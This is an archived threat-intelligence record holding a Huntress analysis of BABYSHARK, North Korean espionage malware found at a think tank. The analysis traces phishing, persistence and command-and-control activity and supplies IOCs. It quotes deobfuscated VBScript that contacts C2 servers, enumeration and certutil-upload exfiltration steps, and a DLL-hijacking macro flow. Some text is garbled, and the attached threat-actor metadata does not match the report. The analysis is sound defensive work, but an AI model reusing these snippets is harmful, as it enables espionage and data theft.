{
    "id": "f07fd4eb-c343-4ac8-a2fc-f781b437cf80",
    "created_at": "2023-01-12T15:01:00.518887Z",
    "updated_at": "2025-03-27T02:16:25.901966Z",
    "deleted_at": null,
    "sha1_hash": "6be39c5032873cce23aa221e2e2994466a85672b",
    "title": "2022-03-01 - Targeted APT Activity- BABYSHARK Is Out for Blood",
    "authors": "",
    "file_creation_date": "2022-05-28T02:26:06Z",
    "file_modification_date": "2022-05-28T02:26:06Z",
    "file_size": 5591954,
    "plain_text": "# Targeted APT Activity: BABYSHARK Is Out for Blood\n\n**huntress.com/blog/targeted-apt-activity-babyshark-is-out-for-blood**\n\ntl;dr: This blog follows the ThreatOps investigation of targeted DPRK (North Korean) backed cyber espionage efforts against Nuclear Think\nTanks. It details the threat hunt from beginning to end, including how our ThreatOps analysts found the threat, how our team peeled back the\nlayers to analyze the malicious activity and how the threat actors phished their way into the partner's network in the first place. Scroll to the\nbottom for indicators of compromise.\n\n[On February 16, Huntress discovered malicious and targeted advanced persistent threat (APT) activity within a trialing partner organization.](http://huntress.com/trial)\nThis activity aligns with known tradecraft attributed to North Korean threat actors targeting national security think tanks.\n\n[The uncovered malware family, dubbed BABYSHARK by other researchers, is used by a DPRK state-sponsored threat actor. This variant was](https://attack.mitre.org/software/S0414/)\nsignificantly customized and tailored to the specific victim environment, indicating a targeted attack.\n\nIn this blog, we'll pull back the curtain on the technical details, our internal process of investigation and the lessons learned for the greater\nsecurity community.\n\n## Right of Boom and Backwards\n\n[This story begins with our tried-and-true service: detecting persistence, or how hackers establish and maintain access to their victim.](https://www.huntress.com/defenders-handbook/persistence-in-cybersecurity)\n\n\n-----\n\nDiscovering persistence mechanisms keys us in that there was undeniably malicious threat actor behavior. We start with this scene of the\ncrime, and then work backward, unveiling new clues and breadcrumbs to uncover the full picture.\n\nOnce our 24/7 ThreatOps analysts identified the activity, we began an investigation to identify how deep the rabbit hole went.\n\nOur initial discovery was a scheduled task, masquerading with the name GoogleUpdater that ran a [VBScript script](https://gist.github.com/JohnHammond/7ed632eb8686ca86b6d8586db4ffc0ba) qwert.vbs. This is a\n[commonly used technique (MITRE ATT&CK T1035.005) to blend in and avoid detection by sounding like something legitimate‚Äîin this case,](https://attack.mitre.org/techniques/T1036/)\nGoogle. Using a legitimate file (wscript.exe) to run the malicious script further helps to avoid detection that is based on scanning of the binary\nthat is running.\n\n**qwert.vbs included code to reach out to a Google Drive file.**\n\n\n-----\n\nViewing this Google Drive file, it turns out to be completely blank: an empty file. Note the lengthy filename at the very top of the display,\nhowever.\n\nDownloading the page with `curl, we can see the HTML source of the Google Drive page‚Äîwhich does not appear to be overtly malicious`\nupon first glance. But taking a closer look, we uncovered some odd ‚Äúmarkers‚Äù in the lengthy file name displayed.\n\n\n-----\n\nAside from what looked like gibberish, there were the strings `‚Äúmanage‚Äù with parentheses following it‚Äîalmost to look like a function call, as if`\nthe parameters `d=7 were passed in. Immediately following it was a` `johnbegin-- and a significant amount of nonsense characters, and`\neventually a `--johnend string. The` `johnbegin and` `johnend text seemed to be delimiters to wrap around the random data‚Ä¶ perhaps that`\nwas encoded data in some way!\n\nWith that breadcrumb, our ThreatOps team began looking over open-source research online to determine if others have seen these\n‚Äú johnbegin ‚Äù and ‚Äú johnend ‚Äù markings.\n\nNorth Korea's recent BabyShark malware works with the fileless technique by downloading encrypted malicious scripts from Google\n[drive. Malicious scripts distinguish between start and end with \"johnbegin\" and \"johnend\". pic.twitter.com/6INRjQeecs](https://t.co/6INRjQeecs)\n\n[‚Äî IssueMakersLab (@issuemakerslab) March 21, 2020](https://twitter.com/issuemakerslab/status/1241250182810857480?ref_src=twsrc%5Etfw)\n\n[Thanks to some shared intelligence by Palo Alto‚Äôs Unit42,](https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/) [malware reporting sites and others, we were able to discover that these delimiters](https://malware.news/t/understanding-detecting-c2-frameworks-babyshark/49865)\nwere key indicators of a strain of malware dubbed BABYSHARK, known for being used by North Korean state-sponsored threat actors.\n\n\n-----\n\no g ou due d ge ce to ead up o t e g eat a a ys s a d esea c o t ose o a e see t s t e d be o e us, t as c ea t e\nprevious sightings dated back to the 2018-2019 timeframe. For this specific incident, the first indicators of compromise we uncovered were in\nMarch of 2021.\n\n**Knowing that we were now digging into a malicious APT activity, we deployed our** **[Process Insights functionality to this host and](https://www.huntress.com/blog/threat-recap-process-insights-trial-by-fire)**\n**organization for even greater visibility.**\n\n## Peeling Back the Layers\n\nWith a better understanding of what we were looking at, we continued to dig through the `qwert.vbs sample.`\n\nFrom reading the code, we could see that this scheduled VBScript would download the contents of this Google Drive page on first execution\nand carve out the obfuscated data between the `johnbegin and` `johnend delimiters to be saved as a file` `normal.crp . Later, upon second`\nexecution by the scheduled task, the script deobfuscates the saved data and executes it as VBScript.\n\nConsidering we can see the deobfuscation routine, we can run that on our own and unravel what actual code would be present and executed\nfrom `normal.crp .`\n\n**Note: This screenshot is an excerpt of the code present and the full file can be reviewed with the gist link above.**\n\nThere is a lot to unpack and discuss within this VBScript code. We will start with the most interesting observation: the malware checks the\n_current username._\n\n## The Cast of Characters\n\nWe want to emphasize that the observed APT activity is highly targeted against this organization and affiliated individuals.\n\nThe target organization fits the category of ‚Äúthink tanks,‚Äù as alluded to in the very beginning of this post. Additionally, this target‚Äôs computer had\na hostname referring to the owner and user‚Äîwho, for partner confidentiality, we'll refer to as Alex.\n\nAlex's computer was not the only host in this organization that Huntress was supporting‚Äîother devices with a hostname based on their user\nwere visible to us, but during the time of our analysis, only Alex's machine was online. To tell the whole story, we knew we needed access to\nanother important user‚Äôs machine. We will refer to this user as Bob.\n\nNotice that the `normal.crp file specifically checks for the presence of the username ‚ÄúAdministrator,‚Äù or our newly introduced character,`\n‚ÄúBob.‚Äù The malware would not run if it was not under Bob. If the current username did not match either of these two names, the malware will\nreach out to an HTTP C2 server. The malware will then stop itself from executing on the system.\n\n\n-----\n\ns as pa t cu a y te est g to us s attac as ta o ed to ocus o y o ob (a d o y ) t e use a e atc ed ob, t e t ou d\nadd persistence mechanisms in the Windows registry, stage new obfuscated files, and continue communications with its C2 servers.\n\n## Following Breadcrumbs\n\nNoting the newly discovered activity from `normal.crp, we found several other persistence mechanisms on the host. We discovered the`\nscheduled task named `Microsoft-Windows-UpdateDefender that used another VBS script called` `sys0.vbs to open up a registry key`\n```\nHKEY_CURRENT_USER\\Software\\RegisteredApplications\\[random] and perform some string replacement on the data stored there and\n\n```\nexecute the contents.\n\n(This filename `sys0.vbs differs from the suggested` `sys1.vbs name in the recovered` `normal.crp script, but after finding both renditions`\n[on different hosts, both contain the same contents).](https://gist.github.com/JohnHammond/d59b9dc0858c4e0e7a1216f7a7eab636)\n\nExamining the contents of the task file showed that the commands were executed every 29 minutes, while `sys1.vbs would be executed`\nevery 61 minutes.\n\nThis was also confirmed by looking at the data collected by Process Insights. Process Insights is the newest addition to The Huntress\nManaged Security Platform, offering greater visibility and telemetry on actions performed on an endpoint at the process level. This captures\ninformation like process spawn time, origination, path and any subsequent child process data‚Äîin real-time. üòâ\n\n(Click the above image to enlarge it)\n\nThe `filexx.tmp and` `schedxx.tmp files were written to disk as means of checking if this code was executed previously. These files were`\nnot present on Alex's machine at the time of our analysis.\n\nThe registry value at `\"HKEY_CURRENT_USER\\Software\\RegisteredApplications\\AppXr1bysyqf6kpaq1aje5sbadka8dgx3g4g\" contained`\n[even more VBScript code](https://gist.github.com/JohnHammond/7b619e5baaf8e25bad652dd27bb826a3)\n\n\n-----\n\nThis code reached out to a C2 domain to retrieve the contents for yet another new file, `desktop.tmp, if it was not already present. This code`\nis exactly in line with what we uncovered from the `normal.crp, but it pulls from a different C2 domain ( worldinfocontact[.]club rather`\nthan `hodbeast[.]com ).`\n\nThe distinction between these domains seemed to be that `worldinfocontact[.]club is their beaconing command and control. It reached`\nout to this C2 on a set interval, retrieved any pending commands to be executed, slept, then executed those new tasks. The response from\n```\nworldinfocontact[.]club /111/alex/expres[.]php?op=2 was inherently going to vary from time to time as the threat actors queued\n\n```\nnew commands and scripts to execute remotely.\n\nThe contents of `desktop.tmp were then subsequently changing as they were the last set of commands sent by the C2 server.`\n\nThe `desktop.tmp file contents we uncovered on Alex's machine were obfuscated commands to run the` `OneDrive.exe process. It is fair to`\nsay that this is the ‚Äúfallback‚Äù procedure from the C2 (when no other commands were pending) to ensure whatever DLL hijacking they set up\nwould continue to execute, even if the OneDrive process was stopped. We will revisit the alleged DLL hijacking technique in our analysis of\nother artifacts soon.\n\nThis deobfuscated `desktop.tmp on Alex's host is below:`\n\nOn Error Resume Next:Set\nwShell=CreateObject(\"WScript.Shell\"):retu=wShell.run(\"\"\"%userprofile%\\AppData\\Local\\Microsoft\\OneDrive\\onedrive.exe\"\"\n/background\",0,false)\n\nBear in mind that this was returned from the `worldinfocontact[.]club endpoint. However,` `hodbeast[.]com, on the other hand, returned`\nobfuscated syntax that would ultimately run some enumeration commands and write the output to a file `ttmp1.log .`\n```\n   cmd.exe /c PowerShell Get-Process outlook ^| Format-List Path\n   cmd.exe /c whoami\n   cmd.exe /c net user\n   tasklist\n\n```\nThe `ttmp1.log file is then Base64 encoded with` `certutil -f -encode to be saved as` `ttmp.log and then uploaded to`\n```\nhttps[:]//hodbeast.com/silver/upload[.]php with a POST request.\n\n```\n**This data exfiltration technique is in line with** **[previous sightings and is known in](https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf)** **[the MITRE ATT&CK page for BABYSHARK](https://attack.mitre.org/software/S0414/)**\n**malware.**\n\nFinally, other files present on Alex's machine were `desktop.r5u` [and](https://gist.github.com/JohnHammond/acd830ff6342bc027fadb3217ab08b79) `desktop.xml . These files had identical contents. The ‚Äú BEGIN ‚Äù and`\n‚Äú END ‚Äù certificate delimiters indicate this file would also be unraveled with `certutil .`\n\n\n-----\n\n```\ndesktop.r5u and desktop.xml decode to a RAT.\n\n```\nLooking at the first few characters ( TVqQAA ) we can see that this is probably a base64 encoded PE file. Indeed, using CyberChef, we can\ndecode the base64 text to obtain a DLL file.\n\nLoading the DLL in `pestudio reveals a pdb path that leaves nothing to the imagination:`\n**‚Äú H:\\Hollow\\googleDrive_rat_load_complete\\rat_load\\Release\\rat_load.pdb ‚Äù**\n\nIt‚Äôs worth noting that this file cannot be found in VirusTotal. While we have not yet finished our analysis on this DLL, it is not a stretch to\n[consider this could be a variant of the KimJongRAT known to be often used alongside BABYSHARK.](https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/)\n\nThe `desktop.xml file seems to copy itself to (or possibly check for)` `desktop.r5u file in` `%appdata\\roaming\\Microsoft% directory as this`\ncan be found hardcoded in the binary.\n\nIt also contains references to the following DLLs within an embedded PE file:\n\n\n-----\n\nThe exports from this binary are as follows:\n\nIf there weren‚Äôt already enough moving pieces to this story, we uncovered even more activity through `wscript.exe with our Process Insights`\ncapability. Alongside the running scheduled tasks, there was an occurrence of a script `CF8C.vbs being run out of Alex's temporary directory.`\n\n**wscript.exe C:\\Users\\Alex\\AppData\\Local\\Temp\\CF8C.vbs [MoreVBScript]**\n\nThis `CF8C.vbs file was no longer present on the host, but considering it had practically the contents of another script passed as another`\nargument, it was clear it would again deobfuscate or substitute symbols and execute more VBScript.\n\n[This deobfuscated VBScript reaches out to a OneDrive link, a tactic once again referenced in other public research, then deobfuscates and](https://gist.github.com/JohnHammond/b450d9efe00c80bbe85b3a05d72d74f3)\nexecutes the supplied VBScript.\n\n\n-----\n\n[This decodes to...](https://gist.github.com/JohnHammond/6f55e4d18951f941e11a172a1db40971)\n\nOn Error Resume Next:Set fs = CreateObject(\"Scripting.FileSystemObject\"):Set ws=CreateObject(\"WScript.Shell\"):Set p0 =\nCreateObject(\"msxml2.xmlhttp\"):scriptdir = ws.ExpandEnvironmentStrings(\"%appdata%\"):userdir =\nws.ExpandEnvironmentStrings(\"%userprofile%\"):username =\nlcase(ws.ExpandEnvironmentStrings(\"%username%\")):username=Escape(username):username=Replace(username,\"%u\",\"\"):chk=\"no\":username=\n\"GET\", \"https://frebough.com/onedrive/winmm.php?op=\" +username,false:p0.setRequestHeader \"Content-Type\", \"application/x-www-formurlencoded\":p0.Send\n\nPresumably, this is to tell yet another C2 server that this step is completed. It does not seem to execute more code from the response.\n\n## Additional Artifacts\n\nAlongside the `qwert.vbs file we found on Alex‚Äôs host, we uncovered multiple other strange files.`\n```\nr.vbs seemed to kill the OneDrive.exe process, wait three seconds, and remove a version.dll file present in the same directory as\n\n```\nthe OneDrive executable. Then, five seconds later, it runs the `OneDrive.exe process once more.`\n\nOn Error Resume Next\n\nSet wShell=CreateObject(\"WScript.Shell\")\n\nretu=wShell.run(\"cmd.exe /c taskkill /im onedrive.exe /f & timeout 3& del\n\"\"%userprofile%\\AppData\\Local\\Microsoft\\OneDrive\\version.dll\"\"\",0,true)\n\nretu=wShell.run(\"cmd.exe /c timeout 5\",0,true)\n\nretu=wShell.run(\"\"\"%userprofile%\\AppData\\Local\\Microsoft\\OneDrive\\onedrive.exe\"\" /background\",0,false)\n\nUnfortunately we were unable to find the `version.dll file on Alex's host or any other affected machines. Considering the file placement, this`\n[looks to be a known DLL hijacking technique to run additional code.](https://packetstormsecurity.com/files/158380/Microsoft-OneDrive-19.232.1124.0010-DLL-Hijacking.html#:~:text=A%20file%20hijacking%20vulnerability%20was,the%20privileges%20of%20the%20victim.)\n\nConsidering this script removes the `version.dll file, once again runs OneDrive with normal execution, and the slight filename ‚Äú r.vbs ‚Äù`\nperhaps this is a mechanism to ‚Äúremove‚Äù another implant. We later discovered this same code on Bob‚Äôs machine under the filename `1.vbs .`\n\nAdditionally, a `dev.ps1 file was found on the affected host. This used inline C# code within PowerShell to seemingly track Google Chrome`\nand Microsoft Edge tabs, monitor the use of Browser Developer Tools and log these to a `tabid_chrome.log,` `tabid_edge.log and a`\n```\nliving.log file that was updated the current date and time. These log files contained nothing more than an identification number for each\n\n```\ntab, but we could see from the `living.log` file that this code was actively running on the victim.\n\n(We later discovered `dev.vbs on Bob‚Äôs machine which looks to kickstart the` `dev.ps1 file‚Äîalso present with the same contents under the`\nfilename `onenote.vbs .)`\n\nOn a separate user‚Äôs machine (we will call them Charlie for the sake of storytelling) we discovered the `onenote.vbs file with` slightly different\ncontents to invoke the PowerShell script with a different technique, as well as a new `pow.ps1 that looked to remove Google Chrome security`\npreferences.\n\n## Putting the Puzzle Pieces Together\n\nWhile we continued to do analysis on the files and threads we uncovered, we knew we were slowly building the big picture of this attack chain.\nConsidering how BABYSHARK malware would traditionally be run, we knew we were still missing one critical piece of information: the initial\naccess where this all started from. Where was the phish?\n\nThe first step in finding initial access was to figure out the timeframe of the compromise. To do that, we searched for other interesting files on\nthe machines. The earliest found script file was the `sys0.vbs script we found earlier. The timestamps for this file placed our timeline starting`\non March 9, 2021. This helped us narrow down the timeframe from when the malicious document(s) may have been downloaded.\n\nThe APT group is known to use spear phishing emails with malicious links embedded or malicious documents attached to gain access, so we\nstarted hunting for them on the system. Being extremely cautious of what we could dig through, we examined only suspicious Microsoft Office\nduring the early months of 2021\n\n\n-----\n\nU o tu ate y, e cou d t d a s o g gu ut at t at t e, o y e s co pute as o e a d co u cat g t u t ess\n\nAs we communicated with this trialing partner, explaining what we uncovered and the gravity of this incident, they notified the players involved.\nSoon enough, the other compromised machines (Bob's and Charlie's, specifically) came online.\n\nWith those hosts now accessible to Huntress, we could correlate what files were present across all of these compromised machines. While the\nAV product the organization was using did not stop the intrusion, it at the very least had logs of what files were scanned and when.\n\nUsing the logs across all three hosts, we uncovered only a handful of files that were present on each host. The most interesting file that stuck\nout to us was `VOA_Korea.zip . From the logs, we could tell it had a` `.doc file inside of it, and this seemed promising. We also noticed that`\nthe scanning of the ZIP file and its contents failed. This could be indicative of password protection.\n\nIf you hadn‚Äôt caught on to the acronym, the VOA in this case refers to the Voice of America media organization. Voice of America is an\ninternational broadcasting station in the United States, focusing on offering information and news from countries and continents all over the\nworld.\n\nAttempting to retrieve the `VOA_Korea.zip file, it was unfortunately no longer present on each of the compromised machines.`\n\nAV logs revealed that the end user attempted to download this file two times.\n\n## Finding the Phish\n\nThere was still a `VOA_Korea (1).zip that was present and we were able to retrieve the file. Uncompressing the archive, we hit another wall`\n‚Äîthe `.doc file was password protected. This doubles as both a sneaky phishing tactic, but also to potentially hide malicious macros from`\nantivirus software.\n\nIt was at this point that we went from hunting to hacking and started trying to crack open the file. We do say our offense is your defense, after\nall! üòâ\n\nAfter throwing combinations of John The Ripper and Hashcat with different wordlists and rule files, eventually, a boring, basic bruteforce found\nthe password: `voa2021 .`\n\nWith a rush of adrenaline, we went to examine the decrypted Microsoft Word document, opting for the one of quickest tools for macro analysis,\n```\nolevba .\n\n```\nThe .doc file lit up like a Christmas tree.\n\n\n-----\n\n[We found the malicious macro document used for initial access! After some quick deobfuscating (same technique as seen previously), we](https://gist.github.com/JohnHammond/070af94c211536109642feff1fbc950e)\ncould see the whole picture for this attack.\n\nThis macro tells the story for almost each of the puzzle pieces we had uncovered previously.\n\nChecks for the presence of OneDrive\nDownloads a new Microsoft Word document to show the user and convince them of the phish:\n( http[:]//beastmodser.club/sil/0304/VOA_Korea[.]docx )\nChecks for the presence of antivirus products like BitDefender or Norton Security, and quits if present\nDisables Microsoft Word macro protections in registry\nDownloads a `version.tmp file to be then moved and renamed as` `version.dll` for the OneDrive DLL hijacking attack\n( https[:]//beastmodser.club/sil/0304/d[.]php?na=version.gif )\n\nStarts `OneDriveStandaloneUpdater.exe to begin the DLL hijacking attack`\n\nChecking for the presence of antivirus or security software is a common technique for sophisticated malware samples, but this adds to the\nstealth of the operation. The malicious macro bailing out and not detonating if there are certain products present makes this even more\ntargeted.\n\nWhile this explained the `version.dll, unfortunately, we were unable to retrieve the original file from the malicious hosting URL. Neither the`\nfaked `VOA_Korea.docx` file or the DLL were still present on the newfound `beastmodser[.]club domain‚Ä¶ but it is at least known evil. üòâ`\n\n\n-----\n\nOther reports on BABYSHARK malware have explained how it does disable macro warnings and Microsoft Office security protections. This\nwas very evident in the code run by the macro‚Ä¶changing registry values to disable defense across practically every version of Microsoft\nWord.\n\nA quick synopsis of the commands ran within that macro:\n\n## Lures and Phishbait\n\nWith the discovery of the initial attack vector and phishing document, and after analysis of the pertinent files to determine the scope of this\nattack, we felt this investigation was coming to a close. But even after finding the malicious macro, we were still curious‚Äîwhat convinced Alex\nto open this file?\n\nThe ‚Äúlure‚Äù looked safe and secure, tucked away inside of a ZIP file with a password-protected document‚Ä¶ what was the pretense?\n\nWe asked the trialing partner if they could find the original email. Here we showcase a fascinating back-and-forth with some cunning deception\nand a well-played scheme.\n\n\n-----\n\nThe threat actor reaches out to Alex under the guise of collecting info for the VOA, masquerading as a real VOA author (that author link is\nlegitimate, along with the Twitter profile). There is no attachment‚Äîthey ask for input from the victim.\n\nAlex falls for the bait, but there is at least one clue that suggests this may have originated from an illegitimate source:\n\nVoice of America probably doesn‚Äôt use Yahoo as their email provider. ü•¥\n\nAlex has no cause for concern here‚Äîthey sent them a document with answers to their questions. For the final trick, our threat actor suggests\nthey have ‚Äúmade some edits‚Äù and are sending the last copy back for final approval. To ‚Äúbe secure,‚Äù the document is password protected. üòà\n\n\n-----\n\nThere is the smoking gun‚Äîa OneDrive link with the hosted download for our `VOA_Korea.zip file, with the password-protected Word`\ndocument with the macro that kickstarts this compromise.\n\nThinking back to the malicious VBScript, wasn‚Äôt the target Bob, and not Alex? The threat actor may have used a roundabout method to get the\ntrue victim‚Ä¶ but it worked.\n\nAlex forwarded the email to their co-workers for their approval and carbon-copied the other victims.\n\nThere is no further correspondence in the email chain. The threat actor had what they wanted, and the victims were unaware they had just\nbeen phished‚Äîbecause it was, after all, a very clever ploy.\n\nAfter we had finished our investigation and shared everything learned with the targeted organization, we continued our analysis. We found one\n[particularly interesting news article dating back to December of 2021: ‚ÄúHackers use fake media domains to trick North Korea researchers‚Äù...](https://www.nknews.org/2020/12/hackers-use-fake-media-domains-to-trick-north-korea-researchers/)\nspecifically VOA, under the very same guise.\n\nLooking back, this was very clever malware filled with living-off-the-land techniques, using normally trusted software with OneDrive and Google\nDrive, staged with a particular stealthy phishing lure‚Ä¶ but, we were disappointed in what earned the damning click.\n\n\n-----\n\nThe malicious Word document itself is the most cookie-cutter, vanilla phish bait that one might see in generic and bland cybersecurity training.\nDespite how often security professionals scream and shout about these barebone basics of security hygiene, still this can slip by and damage\nan organization.\n\n‚ÄúPlease click here‚Äù is all an APT needs.\n\n## Lessons Learned\n\nThe adversary here is likely a well-funded nation-state-supported threat actor, whose operations are known for their phishing prowess and\nbuilding trust or a connection before dangling the lure. The remote access trojan and data exfiltration capabilities have been present and active\nin the target environment for nearly a year.\n\nWe tend to share statistics and infographics about hacker dwell-time being weeks, or months, but this malware has gone unnoticed for much\nlonger. While the victim organization had antivirus, the threat still slipped past. From our own analysis, looking through the logs, it is\ndisheartening to see the exact moment where prevention efforts fell short.\n\nWith that, we offer a gentle reminder: prevention will fail. There is immense value, though, in logging, monitoring, and hunting. All the threads\nof this story could not have unfolded without the data retention and logged information available to our team of analysts and investigators.\n\nWhether the infecting malware stems from an unskilled actor, just grabbing code off the shelf, or a trained and sophisticated APT, detection\nand human analysis must be in play.\n\nThe Huntress Managed Security Platform has been augmenting more features and functionality to enrich our partners' reporting and insight.\nCombining the powers of each of these services (Persistent Footholds, Managed Antivirus, Process Insights, etc.), we can gain a greater\nunderstanding of incidents and compromises‚Äîand for finding APT activity on a trialing partner's system, we hope that offers a great example.\n\n- ‚Ä¢ ‚Ä¢\n\n**Special thanks to analysts, researchers, account representatives, engineers and all involved in response to this incident and their**\n**contributions to this blog: Cat Contillo, Matt Anderson, Caleb Stewart, Dave Kleinatland, John Hammond, Matthew Brennan, Tim Kasper,**\nClarissa Bove, Jamie Levy, Max Rogers, Greg Ake, Rob Noeth and Sharon Martin.\n\n**Indicators of Compromise**\n\n\n-----\n\n**Type** **Item** **Notes / sha256 Hash**\n\nURL `retmodul[.]com` Accessed during execution of `normal.crp .`\nattack.\n\nURL `hodbeast[.]com` Staging C2 url\n\nURL `worldinfocontact[.]club` Beaconing C2 url\n\nURL `frebough[.]com` Staging C2 url\n\nURL `beastmodser[.]club` Staging C2 url\n\nStrings `H:\\Hollow\\googleDrive_rat_load_complete\\rat_load\\Release\\rat_load.pdb` String in `desktop.xml and` `desktop.r5u`\n\n\nRegistry\nKey\n\n\n`HKEY_CURRENT_USER\\Software\\RegisteredApplications\\[random characters]` Contained code that was executed by sys0.v\n\n\nFile `c:\\Users\\<user>\\AppData\\Roaming\\desktop.tmp` 5b31d65b0607ae3de40ff8376bb83f3ff4defba3\n\nFile `C:\\Users\\<user>\\AppData\\Roaming\\r.vbs` c86d6e9dfc79bdf29f0826327992f8cf3df3e1ed\n\nFile `C:\\Users\\<user>\\AppData\\Roaming\\1.vbs` c86d6e9dfc79bdf29f0826327992f8cf3df3e1ed\n\nFile `C:\\Users\\<user>\\Microsoft\\sys0.vbs` bf82675bac2cd574fa8b87659217bffb29d4bc4\n\nFile `C:\\Users\\<user>\\Microsoft\\sys1.vbs` bf82675bac2cd574fa8b87659217bffb29d4bc4\n\nFile\n\n`C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\desktop.xml` As a certificate:\n\n2ad3266331e405677c68bb43c490467107ca3\n\nConverted DLL:\ne314b40449b7b9b84f20f49f898885114335733\n\nFile `C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\desktop.r5u`\n\nAs a certificate:\n2ad3266331e405677c68bb43c490467107ca3\n\nConverted DLL:\ne314b40449b7b9b84f20f49f898885114335733\n\nFile [hash unavailable]\n```\n      C:\\Users\\<user>\\AppData\\Local\\Microsoft\\OneDrive\\version.dll\n\n```\nFile `C:\\Users\\<user>\\AppData\\Local\\Microsoft\\OneDrive\\version.tmp` [hash unavailable]\n\nFile `C:\\Users\\<user>\\AppData\\Roaming\\normal.crp` e3b0c44298fc1c149afbf4c8996fb92427ae41e\n\nFile\n\n`C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\qwert.vbs` e08fe0b287b4d112514276c2b102b9c80b4dab\n\nFile\n\n`C:\\Users\\<user>\\AppData\\Microsoft\\ttmp.log` [hash unavailable]\n\nFile Checked by `normal.crp for run status, crea`\n\n`C:\\Users\\<user>\\AppData\\Microsoft\\filexx.tmp` are 111\n\n\nFile `C:\\Users\\<user>\\AppData\\Microsoft\\schedxx.tmp` Checked by `normal.crp for run status, crea`\nare 111\n\n\nFile\n\n\n\n[hash unavailable]\n\n```\nC:\\Users\\<user>\\AppData\\Local\\Temp\\CF8C.vbs\n\n```\n\n-----\n\nFile\n\nFile\n\n```\nC:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\dev.ps1\n\n```\n```\nC:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\pow.ps1\n\n```\n\ndef0975728fc5da61c022bb62b7160e2764631\n\nd41c943fd5ffacde74f487df6a43b72e9730f058\n\n\nFile `c:\\users\\<user>\\appdata\\roaming\\Microsoft\\living.log` (Hash varies based off the current time)\n\nFile\n\n`C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\tabid_chrome.log` (Hash varies due to logging)\n\nFile\n\n`C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\tabid_edge.log` (Hash varies due to logging)\n\nFile\n\n`c:\\Users\\<user>\\AppData\\Roaming\\microsoft\\Windows\\start` c327631a212e4a9681e3cf1574c500ce370018\n```\n      menu\\Programs\\Startup\\OneNote.vbs\n\n```\n(Note: hash may vary across different machine\n\n**John Hammond**\n\nThreat hunter. Education enthusiast. Senior Security Researcher at Huntress.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-01 - Targeted APT Activity- BABYSHARK Is Out for Blood.pdf"
    ],
    "report_names": [
        "2022-03-01 - Targeted APT Activity- BABYSHARK Is Out for Blood.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535660,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653704766,
    "ts_modification_date": 1653704766,
    "files": {
        "pdf": "https://archive.orkl.eu/6be39c5032873cce23aa221e2e2994466a85672b.pdf",
        "text": "https://archive.orkl.eu/6be39c5032873cce23aa221e2e2994466a85672b.txt",
        "img": "https://archive.orkl.eu/6be39c5032873cce23aa221e2e2994466a85672b.jpg"
    }
}